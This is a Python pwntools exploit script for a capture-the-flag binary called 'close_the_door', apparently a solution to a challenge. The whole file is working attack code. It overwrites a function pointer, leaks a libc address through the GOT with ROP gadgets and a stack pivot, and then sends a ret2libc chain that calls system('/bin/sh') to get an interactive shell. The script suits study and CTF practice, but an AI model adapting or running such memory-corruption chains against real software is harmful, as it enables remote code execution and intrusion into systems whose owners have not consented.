#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 close_the_door
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge/close_the_door')
libc = ELF('challenge/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

poprsi_popr15 = 0x0000000000400b51
poprdi = 0x0000000000400b53
ret = 0x0000000000400646
moveax_leave = 0x0000000000400ae0
companion = 0x00602060
data = 0x00602500
reset_check = 0x00400900
hidden_func = exe.sym["hidden_func"]

io.recvuntil("> ")
io.send(p64(reset_check) + p64(hidden_func)[:-1])

io.recvuntil("> ")
io.sendline("42")

payload = flat({
    0x40 - 0x1c: p32(8),
    0x40 - 0x18: exe.got["write"],
    0x40: companion,
    0x40 + 8: [
        moveax_leave,
        data,
        ],
    })

io.recvuntil("> ")
io.send(payload)

leak = io.recv(numb=8)
libc.address = u64(leak.ljust(8, b'\x00')) - libc.sym["write"]
print(hex(libc.address))

payload = flat({
    0x40 - 0x1c: p32(8),
    0x40 - 0x18: 0,
    0x40: companion,
    0x40 + 8: [
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        poprdi,
        next(libc.search(b"/bin/sh\x00")),
        libc.sym["system"],
        ],
    })

io.recvuntil("> ")
pause()
io.send(payload)

io.interactive()

